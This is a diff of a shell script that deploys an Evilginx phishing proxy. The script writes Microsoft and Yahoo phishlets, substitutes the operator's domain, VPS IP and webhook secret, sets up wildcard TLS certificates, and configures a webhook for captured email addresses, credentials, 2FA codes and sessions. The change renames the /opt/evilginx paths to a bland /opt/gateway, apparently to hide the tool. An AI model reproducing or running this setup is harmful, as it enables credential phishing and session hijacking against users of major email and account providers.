@@ -207,7 +207,7 @@ webhook:
   events: ["email", "credentials", "2fa", "session"]
 EOF
 
-    cat > /opt/evilginx/phishlets/microsoft.yaml << 'EOF'
+    cat > /opt/gateway/phishlets/microsoft.yaml << 'EOF'
 name: 'microsoft'
 min_ver: '3.0.0'
 proxy_hosts:
@@ -308,7 +308,7 @@ webhook:
   events: ["email", "credentials", "2fa", "session"]
 EOF
 
-    cat > /opt/evilginx/phishlets/yahoo.yaml << 'EOF'
+    cat > /opt/gateway/phishlets/yahoo.yaml << 'EOF'
 name: 'yahoo'
 min_ver: '3.0.0'
 proxy_hosts:
@@ -413,16 +413,16 @@ fi
 
 # Update phishlets with actual values
 log "Configuring phishlets with your domain..."
-sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/evilginx/phishlets/*.yaml
-sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/evilginx/phishlets/yahoo.yaml
-sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/evilginx/phishlets/microsoft.yaml
-sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/evilginx/phishlets/google.yaml
-sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/evilginx/phishlets/*.yaml
-sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/evilginx/phishlets/*.yaml
-sed -i "s/{{.AppPort}}/443/g" /opt/evilginx/phishlets/*.yaml
+sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/gateway/phishlets/*.yaml
+sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/gateway/phishlets/yahoo.yaml
+sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/gateway/phishlets/microsoft.yaml
+sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/gateway/phishlets/google.yaml
+sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/gateway/phishlets/*.yaml
+sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/gateway/phishlets/*.yaml
+sed -i "s/{{.AppPort}}/443/g" /opt/gateway/phishlets/*.yaml
 
 # Create Evilginx config
-cat > /opt/evilginx/config/config.yaml << EOF
+cat > /opt/gateway/config/config.yaml << EOF
 daemon: false
 debug: false
 domain: $DOMAIN
@@ -431,9 +431,9 @@ http_port: 80
 https_port: 443
 dns_port: 0
 autocert: false
-phishlets_path: /opt/evilginx/phishlets
-cert_path: /opt/evilginx/certs
-database: /opt/evilginx/evilginx.db
+phishlets_path: /opt/gateway/phishlets
+cert_path: /opt/gateway/certs
+database: /opt/gateway/evilginx.db
 unauth_url: https://www.google.com
 blacklist:
   enabled: true
@@ -458,12 +458,12 @@ certbot certonly --dns-cloudflare \
     -d "$DOMAIN" -d "*.$DOMAIN" 2>/dev/null
 
 if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
-    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/evilginx/certs/$DOMAIN.crt"
-    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/evilginx/certs/$DOMAIN.key"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/gateway/certs/$DOMAIN.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/gateway/certs/$DOMAIN.key"
     log "SSL certificate installed successfully"
 else
     warn "SSL failed - running in HTTP mode"
-    sed -i 's/https_port: 443/https_port: 0/' /opt/evilginx/config/config.yaml
+    sed -i 's/https_port: 443/https_port: 0/' /opt/gateway/config/config.yaml
 fi
 
 # Create systemd service
